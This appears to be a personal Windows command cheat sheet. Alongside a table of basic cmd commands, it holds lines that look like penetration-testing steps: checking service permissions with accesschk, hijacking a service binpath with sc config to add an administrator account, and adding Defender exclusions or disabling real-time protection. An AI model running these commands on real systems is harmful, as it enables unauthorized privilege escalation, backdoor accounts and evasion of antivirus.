# windows

Download Sysinternals Suite:

```cmd
powershell -Command "Invoke-WebRequest -Uri 'https://download.sysinternals.com/files/SysinternalsSuite.zip' -OutFile '.\SysinternalsSuite.zip'"
```

Extract ZIP file:

```cmd
powershell -Command "Expand-Archive -Path '.\SysinternalsSuite.zip' -DestinationPath '.\SysinternalsSuite'"
```

Check user permissions:

```cmd
accesschk.exe -uwvc "normaluser" * 
```

Add user and assign to Administrators group:

```cmd
cmd /c cmd.exe /c "net user <username> <password> /add && net localgroup Administrators <username> /add"
```

Delete user and remove from Administrators group:

```cmd
cmd /c cmd.exe /c "net localgroup Administrators <username> /delete && net user <username> /delete"
```

Modify the configuration of a service:

```cmd
sc config <service> binpath="cmd /c cmd.exe /c net user <username> <password> /add && net localgroup Administrators <username> /add"
```

Exclude `C:\Temp` folder from Windows Defender:

```cmd
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Temp'"
```

Retrieve list of exclusion paths configured in Windows Defender:

```cmd
powershell -Command "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath"
```

Remove `C:\Temp` folder from Windows Defender exclusion list:

```cmd
powershell -Command "Remove-MpPreference -ExclusionPath 'C:\Temp'"
```

Disable Windows Defender:

```cmd
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" 
```

Enable Windows Defender:

```cmd
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $false"
```

| Command                      | Description                                            |
| ---------------------------- | ------------------------------------------------------ |
| `cd path\to\folder`          | Change directory                                       |
| `cd ..`                      | Go to the parent folder                                |
| `cd`                         | Show current directory                                 |
| `dir`                        | List folder contents                                   |
| `mkdir NewFolder`            | Create a new folder                                    |
| `echo text > file.txt`       | Create a file                                          |
| `del file.txt`               | Delete a file                                          |
| `rmdir FolderName`           | Remove an empty folder                                 |
| `rmdir /s FolderName`        | Remove folder and its contents                         |
| `copy source.txt dest.txt`   | Copy a file                                            |
| `move source.txt dest.txt`   | Move a file                                            |
| `program.exe`                | Execute a program                                      |
| `findstr "text" file.txt`    | Search for specific text in a file (similar to `grep`) |
| `dir \| findstr ".txt"`      | List `.txt` files in the current folder                |
| `dir \| findstr "report"`    | List files with "report" in the name                   |
| `dir /S \| findstr "report"` | List files with "report" in the name in subfolders     |
